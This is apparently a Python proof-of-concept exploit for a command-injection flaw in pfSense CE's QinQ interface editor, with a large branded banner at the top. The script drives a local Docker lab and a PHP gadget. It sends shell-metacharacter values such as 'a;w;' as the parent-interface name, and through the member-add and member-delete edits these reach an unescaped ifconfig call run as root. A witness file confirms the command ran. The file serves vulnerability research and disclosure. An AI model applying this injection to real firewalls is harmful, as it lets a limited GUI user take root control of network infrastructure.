#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: pfsense-qinq-parent-if (High: 8.8)
#  Vendor: pfSense CE (Netgate)
#  Versions: pfSense CE 2.9.0-DEVELOPMENT
#  Impact: QinQ parent-if ifconfig interpolates unescaped; limited GUI user gets root
#  Requires: page-interfaces-qinq-edit; PHP gadget lab; loopback
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "pfsense-qinq-parent-if"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove pfSense QinQ parent-if reaches unescaped ifconfig exec on member edit."""


import json
import os
import subprocess
from pathlib import Path
from typing import Any

LABEL = "PFSENSE-QINQ-PARENT-IF"
WITNESS = "PFSENSE-QINQ-PARENT-IF-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "pfsense-qinq-parent-if")
HERE = Path(__file__).resolve().parent
WITNESS_PATH = f"/oracle/{WITNESS}"
IFCONFIG_LOG = "/oracle/ifconfig-calls"

LIVE_IF = "em0"
SHORT_PARENT = "a;w;"
LONG_PARENT = "abcdefghi;w;"
TAG = "1"
KEEP_MEMBER = "1"
ADD_MEMBER = "2"


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def reset_oracle() -> None:
    proc = compose(
        "exec",
        "-T",
        "lab",
        "sh",
        "-c",
        f"rm -f {WITNESS_PATH} {IFCONFIG_LOG}",
        timeout=20,
    )
    if proc.returncode != 0:
        raise RuntimeError((proc.stderr or proc.stdout or "reset-failed").strip())


def oracle_text(path: str) -> str | None:
    proc = compose("exec", "-T", "lab", "sh", "-c", f"cat {path} 2>/dev/null", timeout=20)
    if proc.returncode != 0:
        return None
    return proc.stdout


def witness_present() -> bool:
    text = oracle_text(WITNESS_PATH)
    return bool(text) and WITNESS in text


def ifconfig_log() -> str:
    return oracle_text(IFCONFIG_LOG) or ""


def run_gadget(mode: str, payload: dict[str, Any]) -> dict[str, Any]:
    blob = json.dumps(payload, separators=(",", ":"))
    proc = compose(
        "exec",
        "-T",
        "lab",
        "php",
        "/lab/gadget.php",
        mode,
        blob,
        timeout=30,
    )
    stdout = proc.stdout or ""
    stderr = proc.stderr or ""
    log(f"IOC gadget-{mode} exit={proc.returncode}")
    if stderr.strip():
        for line in stderr.splitlines()[:12]:
            log(f"IOC gadget-{mode}-stderr {line[:240]}")
    if proc.returncode != 0:
        log(f"IOC gadget-{mode}-stdout {stdout[:400]!r}")
        raise RuntimeError(f"gadget-{mode}-exit-{proc.returncode}")
    line = stdout.strip().splitlines()[-1] if stdout.strip() else ""
    try:
        data = json.loads(line)
    except json.JSONDecodeError as exc:
        log(f"IOC gadget-{mode}-stdout {stdout[:400]!r}")
        raise RuntimeError(f"gadget-{mode}-bad-json") from exc
    if not isinstance(data, dict) or not data.get("ok"):
        raise RuntimeError(f"gadget-{mode}-not-ok")
    return data


def ioc_gadget(name: str, data: dict[str, Any]) -> None:
    errors = data.get("errors") or []
    logs = data.get("logs") or []
    log(
        f"IOC {name} write_config={int(bool(data.get('write_config')))} "
        f"vlan_rejected={int(bool(data.get('vlan_rejected')))} "
        f"create_invalid_if={int(bool(data.get('create_invalid_if')))} "
        f"mwexec={data.get('mwexec_count')} "
        f"vlan_configure={data.get('vlan_configure_count')} "
        f"vlanif_len={data.get('vlanif_len')} "
        f"errors={errors!r}"
    )
    for item in logs:
        log(f"IOC {name}-log {str(item)[:240]}")
    for row in data.get("qinq2") or []:
        if isinstance(row, dict):
            log(
                f"IOC {name}-qinq2 len={row.get('name_len')} "
                f"over={int(bool(row.get('over_namesize')))}"
            )


def main() -> int:
    short_qinq2 = f"{SHORT_PARENT}.{TAG}.{ADD_MEMBER}"
    long_qinq2 = f"{LONG_PARENT}.{TAG}.{KEEP_MEMBER}"
    log(f"label={LABEL} live={LIVE_IF}")
    log(f"IOC namesize short={len(short_qinq2)} long={len(long_qinq2)}")
    if len(short_qinq2) > 15:
        return fail("short-parent-too-long")
    if len(long_qinq2) <= 15:
        return fail("long-parent-not-oversize")

    log("# Integrity: root shell via ifconfig exec (lab-proven = witness file from that exec).")
    log("# Recon: exec output not printed (inferred).")
    log("# Availability: ifconfig/vlan devices (inferred).")
    log("# Closed: VLAN exist check, create-only no exec, IF_NAMESIZE on qinq2, unauth N/A in gadget.")
    log("IOC closed gif-gre=out-of-scope vlan-exist-check=yes unauth=n/a")

    log("== CONTROL vlan-edit ==")
    reset_oracle()
    vlan = run_gadget(
        "vlan-edit",
        {"if": SHORT_PARENT, "tag": TAG, "tag_type": "stag", "members": [KEEP_MEMBER]},
    )
    ioc_gadget("vlan-edit", vlan)
    if not vlan.get("vlan_rejected"):
        return fail("vlan-not-rejected")
    if vlan.get("write_config"):
        return fail("vlan-wrote-config")
    if witness_present() or ifconfig_log():
        return fail("vlan-exec")
    vlan_rejected = True

    log("== CONTROL qinq-create ==")
    reset_oracle()
    created = run_gadget(
        "qinq-create",
        {
            "if": SHORT_PARENT,
            "tag": TAG,
            "tag_type": "stag",
            "members": [KEEP_MEMBER],
        },
    )
    ioc_gadget("qinq-create", created)
    if created.get("errors"):
        return fail("qinq-create-errors")
    if not created.get("write_config"):
        return fail("qinq-create-no-store")
    if not created.get("create_invalid_if"):
        return fail("qinq-create-no-early-return")
    if int(created.get("mwexec_count") or 0) != 0:
        return fail("qinq-create-mwexec")
    if int(created.get("vlan_configure_count") or 0) != 0:
        return fail("qinq-create-vlan-configure")
    if witness_present() or ifconfig_log():
        return fail("qinq-create-exec")
    create_no_exec = True

    log("== IF_NAMESIZE qinq2 member-add overlong ==")
    reset_oracle()
    overlong = run_gadget(
        "qinq-edit",
        {
            "if": LONG_PARENT,
            "tag": TAG,
            "tag_type": "stag",
            "existing_members": [ADD_MEMBER],
            "members": [ADD_MEMBER, KEEP_MEMBER],
        },
    )
    ioc_gadget("qinq2-overlong", overlong)
    over_rows = overlong.get("qinq2") or []
    over_hit = any(isinstance(row, dict) and row.get("over_namesize") for row in over_rows)
    too_big = any("too big" in str(item) for item in (overlong.get("logs") or []))
    if not over_hit or not too_big:
        return fail("if-namesize-not-logged")
    if witness_present() or ifconfig_log():
        return fail("if-namesize-exec")
    if_namesize_block = True

    log("== TRIGGER member-delete destroy ==")
    reset_oracle()
    deleted = run_gadget(
        "qinq-edit",
        {
            "if": SHORT_PARENT,
            "tag": TAG,
            "tag_type": "stag",
            "existing_members": [KEEP_MEMBER, ADD_MEMBER],
            "members": [KEEP_MEMBER],
        },
    )
    ioc_gadget("member-delete", deleted)
    if deleted.get("errors"):
        return fail("member-delete-errors")
    if not witness_present():
        return fail("member-delete-no-witness")
    log("IOC witness-sink destroy-exec interfaces_qinq_edit.php:212")
    destroy_sink = True
    reset_oracle()

    log("== TRIGGER member-add qinq2 ==")
    added = run_gadget(
        "qinq-edit",
        {
            "if": SHORT_PARENT,
            "tag": TAG,
            "tag_type": "stag",
            "existing_members": [KEEP_MEMBER],
            "members": [KEEP_MEMBER, ADD_MEMBER],
        },
    )
    ioc_gadget("member-add", added)
    if added.get("errors"):
        return fail("member-add-errors")
    if not witness_present():
        return fail("member-add-no-witness")
    log("IOC witness-sink qinq2-exec interfaces.inc:620")
    qinq2_sink = True

    member_sink = destroy_sink and qinq2_sink
    if not (vlan_rejected and create_no_exec and member_sink and if_namesize_block):
        return fail("flags-incomplete")

    log(
        f"SUCCESS {LABEL} vlan-rejected=yes create-no-exec=yes "
        f"member-sink=yes if-namesize-block=yes {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

